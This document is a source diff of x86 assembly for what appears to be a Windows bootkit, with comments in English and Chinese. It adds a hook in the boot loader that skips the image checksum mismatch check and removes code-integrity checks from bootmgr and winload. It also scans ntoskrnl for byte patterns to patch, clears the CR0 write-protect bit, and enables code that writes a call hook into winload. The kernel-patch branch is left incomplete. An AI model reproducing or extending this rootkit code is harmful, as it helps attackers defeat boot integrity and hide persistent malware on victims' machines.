@@ -225,6 +225,141 @@ pop es
 popad
 retf
 
+; 加载的第一个pe 是 bootmgr.exe.mui
+FakeImgpLoadPEImage:
+; 1. called by OSLOADER resisting in bootmgr 
+; 2. return address is 0x4216a8
+; 3. ebx(0x2700c0 the pe file header   )
+call dword Obfuscation_Function
+
+; move return eip to the "successful branch" (skip the STATUS_IMAGE_CHECKSUM_MISMATCH)
+; _text:004216A2 3B 43 58                                cmp     eax, [ebx+58h]
+; _text:004216A5 74 18                                   jz      short loc_4216BF
+; C7 45 F8 21 02 00 C0    mov     [ebp+var_8], 0C0000221h ; STATUS_IMAGE_CHECKSUM_MISMATCH
+movsx eax,byte [esi+4] ; esi = Relocate_Me_Code, get jump offset of original code from the backup
+dec eax ; -1 because call [address] used 1 more byte
+add [esp+0x2c],eax ; return eip (2Ch = pushad 32 + pushfd 4  + push eax 4 + call dword Obfuscation_Function 返回地址
+; xchg 替换成了 ebx 即 pe file header)
+
+; why ??????????????????????????????????????
+; get caller's eax register
+lea edx,[edi+0x6]    ; original return address + 6 指令被截断了,需要跳过剩下的6 字节
+movzx eax,byte [esi+0x1]  ; register (eax, 43) of compare opcode
+not al     ; = BCh
+and al,00000111b        ; = 04h
+add al,2        ; = 06h
+mov edi,[esp+eax*4]      ; stack + 6*4  =>  get ebx register..
+
+; valid PE Image?
+cmp dword [edi],'PE' ; verify PE Signature
+jnz Exit_FakeImgpLoadPEImage
+cmp word [edi+0x18],010Bh  ; 010Bh, Magic Number (PE32)
+jnz Exit_FakeImgpLoadPEImage
+
+; scan bootmgr.exe.mui for removing code integrity check, again (shouldn't appear anyway)
+mov ecx,[edi+0x50]  ; SizeOfImage
+and edi,0FFFFF000h  ; page base address of PE Image
+call dword Hook_WinloadExe
+jz Exit_FakeImgpLoadPEImage
+
+; find the signature in ntoskrnl and patch the code
+call Find_Ntoskrnl_Code_Pattern
+;jz Patch_Kernel_Code_Vista   ; if found, patch!
+Exit_FakeImgpLoadPEImage:
+jmp Obfuscation_Return ; return to Windows
+
+Patch_Kernel_Code_Vista:
+nop
+nop
+
+Find_Ntoskrnl_Code_Pattern:
+; Input
+;   ecx = SizeOfImage
+;   edi = Image
+; return value ebx = pointer to code pattern with startin code E8 (= relative call opcode)
+; return status zero flag = 1 found
+push ecx
+push edi
+
+; scan ntoskrnl.exe for code patterns [+ for Vista]:
+;   +  6A 4B 6A 19 / 6A 19 6A 4B
+;     ntoskrnl.1CE87E0h
+;			memory.0x80683ec9
+Scan_Pattern_Ntoskrnl:
+mov al,0x6a
+repne scasb
+jnz Find_Ntoskrnl_Code_Pattern_Exit
+cmp dword [edi-0x1],0x196A4B6A
+jz Signature_1_Found
+cmp dword [edi-0x1],0x4B6A196A
+jnz Scan_Pattern_Ntoskrnl  ; if not equal => continue search
+inc edi   ; weird signature
+Signature_1_Found:
+cmp byte [edi+0x3],0x89    ; 2 possible valid signatures
+jnz No_Extended_Signature
+add edi,byte +0x6
+No_Extended_Signature:
+cmp byte [edi+0x3],0xe8
+jnz Scan_Pattern_Ntoskrnl
+
+; first pattern found, scan for next [same as in previous Sinowal version] signature:
+;   + E8 ?? ?? ?? ?? 84 C0
+;     ntoskrnl.1CE87F3h						ntoskrnl.1CE87F8h
+;			memory.0x80683ed8						memory.0x80683EDD
+lea ebx,[edi+0x8]
+xchg ebx,edi
+mov al,0xe8
+repne scasb
+jnz Find_Ntoskrnl_Code_Pattern_Exit
+cmp word [edi+0x4],0xc084
+xchg ebx,edi
+jnz Scan_Pattern_Ntoskrnl
+
+Find_Ntoskrnl_Code_Pattern_Exit:
+pop edi
+pop ecx
+ret
+
+Obfuscation_Function:
+; [stack + 0] = address to jump to
+; [stack + 4] = passed further in edi  -> return address to Windows / Argument 2
+
+; Output:
+; esi = pointer to Relocate_Me_Code
+; edi = pointer to return code of Windows / Argument 2
+
+; during execution all memory access is possible is cr0.wp cleared
+; return by jumping to Obfuscation_Return
+
+pushad   ; +32
+pushfd     ; +4
+cld
+
+; clear cr0.Write Protect flag (to allow writing into read-only user pages)
+mov eax,cr0
+push eax ; +4
+and eax,0FFFEFFFFh ; clear cr0.WP (bit 16), it is normally set in Windows
+
+; set parameters and call
+; the pe file header
+xchg ebx,[esp+0x28]   ; ebx = return eip  
+mov edi,[esp+0x2c]   ; edi = return address to Windows /Argument 2
+call dword Get_Current_EIP_0
+Get_Current_EIP_0:
+pop esi ; esi = eip
+sub esi,Get_Current_EIP_0 - Relocate_Me_Code   ; set esi to Relocate_Me_Code absolute address
+jmp ebx   ; jump
+
+; restore cr0.wp
+Obfuscation_Return:
+pop eax
+mov cr0,eax   ; everything done fine, restore it and give control back to Windows
+
+popfd
+popad
+pop ebx ; exchange the value back
+ret             
+
 Relocate_Me_Code:
 nop
 nop
@@ -239,11 +374,12 @@ Hook_WinloadExe:
 ;   esi = address of Relocate_Me_Code
 ;   edi = address of memory to scan
 ;   ecx = bytes to scan
-
+; Output
+; zf  0 if bootmgr.exe bootmgr.exe.mui   winload.exe has been succssful patched.
 push ecx
 push edi
 
-; scan winload for some jump offset
+; scan winload for some jump offset in _ImgpLoadPEImage@36  
 ;   + 3B ?? 58 74 ?? C7
 ; patch applied: winload.exe will be hooked
 ;   0041e8c0:  cmp eax, dword ptr ds:[ebx+0x58]         ; 3b4358            ->      call [address]
@@ -259,6 +395,7 @@ cmp byte [edi+0x4],0xC7
 jnz Search_Unknown_Signature
 
 ; backup 6 bytes to overwrite them with custom code
+; break in 0x9edf5
 dec edi                                                                         ; -1 to get to start of signature
 mov eax,[edi]                                                                   ; copy 4 bytes
 mov [esi],eax
@@ -266,12 +403,12 @@ mov ax,[edi+4]                                                                  
 mov [esi+4],ax
 
 ; store new code: FF 15 + address  (call hook)
-;mov ax,0x15FF  ; FF 15, opcodes of call [address]
-;stosw          
-;lea eax,[esi - (Relocate_Me_Code - Windows_Vista_NtKernel_Hook_Code)]   ; get offset of hook code
-;mov [es:esi+6],eax ; set the Hook_Address variable
-;lea eax,[esi+6]   ; get address of variable address, used for call [address]
-;stosd 
+mov ax,0x15FF  ; FF 15, opcodes of call [address]
+stosw          
+lea eax,[esi - (Relocate_Me_Code - FakeImgpLoadPEImage)]   ; get offset of hook code
+mov [es:esi+6],eax ; set the Hook_Address variable
+lea eax,[esi+6]   ; get address of variable address, used for call [address]
+stosd 
 
 ; restore (and store) register contents for searching the next signature
 pop edi
@@ -280,7 +417,8 @@ push ecx
 push edi
 
 ; scan winload for the code that puts ntoskrnl corrupt error status
-;   + 8B F0 85 F6 ?? ?? and value 0C0000098h
+;   + 8B F0 85 F6 75   and value 0C0000098h
+; 8B F0 85 F6 75 ?? ?? 980000c0
 ; patch applied: STATUS_FILE_INVALID error code will be overwritten
 ;   0041f076:  lock test esi, esi        ; f085f6
 ;   0041f079:  jnz .+0x0000000a          ; 750a
